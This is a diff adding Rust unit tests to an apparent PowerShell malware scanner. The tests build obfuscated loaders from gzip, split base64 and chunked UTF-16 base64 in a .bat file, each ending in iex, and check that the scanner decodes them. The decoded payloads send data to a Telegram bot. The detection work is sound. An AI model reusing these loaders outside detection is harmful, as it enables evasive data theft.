@@ -15218,6 +15218,139 @@ iex $stage
     }
 
     #[test]
+    fn ps1_normalization_decodes_variable_gzip_streamreader_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot123:abc/sendMessage?chat_id=777'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            "$c='{b64}';$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($c));$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd());"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://api.telegram.org/bot123:abc/sendMessage?chat_id=777"),
+            "variable GZipStream/ReadToEnd payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($c)"),
+            "variable GZipStream base64 call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_variable_gzip_streamreader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot123:abc/sendMessage?chat_id=777'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            "$c='{b64}';$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($c));$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd());"
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot123:abc/sendMessage?chat_id=777")
+            )),
+            "decoded GZipStream payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_split_variable_gzip_streamreader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot321:xyz/sendMessage?chat_id=999'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let split = b64.len() / 2;
+        let ps = format!(
+            "$p1='{}';$p2='{}';$d=$p1+$p2;$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd());",
+            &b64[..split],
+            &b64[split..]
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot321:xyz/sendMessage?chat_id=999")
+            )),
+            "split variable GZipStream payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_marker_chunk_unicode_base64_carrier_recurses_into_download_trait() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot456:def/sendMessage?chat_id=888'";
+        let mut utf16 = Vec::new();
+        for unit in decoded.encode_utf16() {
+            utf16.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let noisy = format!(
+            "{}waikikibondibeach{}npd{}",
+            &b64[..32],
+            &b64[32..96],
+            &b64[96..]
+        );
+        let chunk_len = noisy.len().div_ceil(5);
+        let chunks: Vec<&str> = noisy
+            .as_bytes()
+            .chunks(chunk_len)
+            .map(|chunk| std::str::from_utf8(chunk).unwrap())
+            .collect();
+        let ps = format!(
+            r#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){{$rawLines=gc $banana|?{{$_ -like ":::*"}};$part1=($rawLines|?{{$_ -like ":::1*"}}|%{{$_.Substring(4)}});$part2=($rawLines|?{{$_ -like ":::2*"}}|%{{$_.Substring(4)}});$part3=($rawLines|?{{$_ -like ":::3*"}}|%{{$_.Substring(4)}});$part4=($rawLines|?{{$_ -like ":::4*"}}|%{{$_.Substring(4)}});$part5=($rawLines|?{{$_ -like ":::5*"}}|%{{$_.Substring(4)}});$kiwi=$part1+$part2+$part3+$part4+$part5;$apple=($kiwi-replace"waikikibondibeach",""-replace"npd","");iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}}
+:::1{}
+:::2{}
+:::3{}
+:::4{}
+:::5{}"#,
+            chunks.first().copied().unwrap_or(""),
+            chunks.get(1).copied().unwrap_or(""),
+            chunks.get(2).copied().unwrap_or(""),
+            chunks.get(3).copied().unwrap_or(""),
+            chunks.get(4).copied().unwrap_or("")
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot456:def/sendMessage?chat_id=888")
+            )),
+            "marker chunk Unicode Base64 payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_escapes_binary_controls() {
         let normalized = crate::ps1_scan::normalize_ps1_text("Invoke-Expression 'A\0B\x01C'\r\n");
         assert!(
